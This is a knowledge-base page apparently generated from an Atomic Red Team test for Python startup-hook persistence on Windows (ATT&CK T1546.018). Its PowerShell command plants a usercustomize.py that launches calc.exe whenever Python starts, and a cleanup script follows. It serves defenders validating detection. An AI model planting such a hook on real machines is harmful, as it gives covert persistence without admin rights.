---
atomic_guid: "05cc7a2c-ce32-46f2-a358-f27f76718c39"
title: "Python Startup Hook - usercustomize.py (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.018"
attack_technique_name: "Event Triggered Execution: Python Startup Hooks"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "05cc7a2c-ce32-46f2-a358-f27f76718c39"
  - "Python Startup Hook - usercustomize.py (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Python Startup Hook - usercustomize.py (Windows)

Executes code via usercustomize.py. This is a per-user persistence mechanism 
that does not require Administrative privileges.

## Metadata

- Atomic GUID: 05cc7a2c-ce32-46f2-a358-f27f76718c39
- Technique: T1546.018: Event Triggered Execution: Python Startup Hooks
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1546.018/T1546.018.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.018]]

## Input Arguments

### python_exe

- description: The python binary name to test
- type: String
- default: python.exe

## Dependencies

Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Prerequisite Check

```text
if (Get-Command @("#{python_exe}", 'python3.exe') -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```text
Write-Host "[!] Python3 not found. Please install Python3 (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/) or ensure it is in your PATH."
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$UserDir = & "#{python_exe}" -c "import site; print(site.getusersitepackages())"
if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force }
"import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py" -Encoding ASCII
Get-ChildItem -Path "$UserDir"
& "#{python_exe}" -c "print('Triggering Hook via usercustomize...')"
```

### Cleanup

```powershell
$PyBin = if (Get-Command "#{python_exe}" -ErrorAction SilentlyContinue) { "#{python_exe}" } elseif (Get-Command "python3.exe" -ErrorAction SilentlyContinue) { "python3.exe" } else { "python.exe" }; 
$UserDir = & $PyBin -S -c "import site; print(site.getusersitepackages())"
if (-not (Get-ChildItem -Path $UserDir -Recurse -ErrorAction SilentlyContinue | Where-Object Name -like 'usercustomize*')) { Write-Host "[!] Artifact missing: $UserDir\usercustomize.py - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
Get-ChildItem -Path "$UserDir" -Recurse -Force |
Where-Object { $_.Name -like "usercustomize*" } |
Remove-Item -Force 
Write-Host "[+] Successfully Removed usercustomize.py under $UserDir"
Get-Process -Name "Calc*", "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
Write-Host "[+] Successfully Terminated Calculator"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml)
